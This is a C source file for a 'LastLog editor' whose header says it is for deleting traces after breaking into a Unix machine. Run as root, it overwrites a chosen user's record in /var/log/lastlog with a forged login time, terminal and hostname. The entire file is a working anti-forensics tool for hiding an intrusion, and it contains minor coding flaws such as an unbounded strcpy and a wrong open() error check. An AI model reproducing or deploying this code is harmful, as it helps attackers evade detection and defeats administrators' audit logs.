/*
 * Lastlog log editor 
 *
 * Useful to delete your traces when you break into a 
 * Unix machine, on which syslog daemon is running.
 *
 * Copyright (c) Danny (Dr.T) 2002
 * admin@ebcvg.com
 *
 *
 * Ability to choose target user by -u <uid> added by iadnah, 2007
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <lastlog.h>
#include <fcntl.h>
#include <memory.h>

static char *s_hname = NULL;       /* hostname */
static char *s_tdate = NULL;       /* time & date */
static char *s_term  = NULL;       /* s_terminal/port */
static char *s_uid = NULL;
unsigned int tuid;
static void usage(char *argv)
{
 /* print usage for LastLog editor */
 printf("LastLog Editor by Danny (Dr.T)\nUsage: %s [options]", argv);
 printf(" [-h hostname]");
 printf(" -d date");
 printf(" -t s_terminal\n");
 printf("Example: ./lastloged -t pts/10 -d `date -d 'May 11 22:11:33' +%%s` -h www.host.com\n");
 exit(-1);
}

static void free_memory_and_exit(char *msg)
{
 if (msg)
  fprintf(stderr, "Error: %s\n", msg);

 if (s_hname)
 {
  free(s_hname);
  s_hname = NULL;
 }
 if (s_tdate)
 {
  free(s_tdate);
  s_tdate = NULL;
 }
 if (s_term)
 {
  free(s_term);
  s_term = NULL;
 }

 exit(-1);
}

int main(int argc, char **argv)
{
 struct lastlog sll;
 int c,  file_hd = -1, sz_ll;

 /* check if we are running as root */
 if (getuid() >  0)
 {
  free_memory_and_exit("only root can run me!!");
 }
 
 /* check if we got seven or five (hostname omitted) arguments */
 if (argc != 7 && argc != 9) 
  usage(argv[0]);
 
 while ((c = getopt(argc, argv, "h:d:t:u:")) != -1)
 {
  if (optarg == NULL)
   free_memory_and_exit("command line parsing failed");

  switch(c)
  {
   case 'h':
    if (strlen(optarg) > UT_HOSTSIZE -1)
     free_memory_and_exit("hostname too long");
    s_hname = (char *)malloc(strlen(optarg)+1);
    if (s_hname == NULL)
     free_memory_and_exit("malloc() failed");
    strcpy(s_hname,optarg);
    break;
   case 'd':
    s_tdate = (char *)malloc(strlen(optarg)+1);
    if (s_tdate == NULL)
    {
     free_memory_and_exit("malloc() failed");
    }
    strcpy(s_tdate,optarg);
    break;
   case 't':
    s_term = (char *)malloc(strlen(optarg)+1);
    if (s_term == NULL)
    {
     free_memory_and_exit("malloc() failed");
    }
    strcpy(s_term,optarg);
    break;
   case 'u':
    s_uid = (char *)malloc(strlen(optarg)+1);
    if (s_uid == NULL)
    {
     free_memory_and_exit("malloc() failed");
    }
    strcpy(s_uid,optarg);
    tuid = atoi(s_uid);
    printf("Altering logs for uid %d\n", tuid);
    break;
   default:
    free_memory_and_exit("command line parsing failed");
    break;
  }
 }

 /* open lastlog file and check for errors */
 file_hd = open ("/var/log/lastlog", O_RDWR);
 if (file_hd < -1)
  free_memory_and_exit("open() /var/log/lastlog failed");

 /* get the lastlog struct size */ 
 sz_ll = sizeof (struct lastlog);

 /* set file pointer to the UID lastlog structure */
 if ((lseek(file_hd, sz_ll * tuid, SEEK_SET)) < 0)
  free_memory_and_exit("lseek() failed");
 
 /* read information about UID to sll */
 if ((read(file_hd, &sll, sz_ll)) < 0)
  free_memory_and_exit("read() failed");
 
 /* set new time & date */
 sll.ll_time = atoi(s_tdate);
 
 /* set new s_terminal/port */
 strncpy(sll.ll_line, s_term, sizeof(sll.ll_line));
 
 /* set the new hostname if specified */
 if (s_hname == NULL)
  sll.ll_host[0] = '\0';
 else
  strcpy(sll.ll_host, s_hname);
 
 /* set file pointer to the UID lastlog structure */
 if ((lseek(file_hd, sz_ll * tuid, SEEK_SET)) < 0)
  free_memory_and_exit("lseek() failed");
 
 /* write new information */
 if ((write(file_hd, &sll, sz_ll)) < 0)
  free_memory_and_exit("write() failed");
 
 /* close /var/log/lastlog */
 close(file_hd);
 fprintf(stdout, "LastLog editor was successfully updated information\n");
}
  
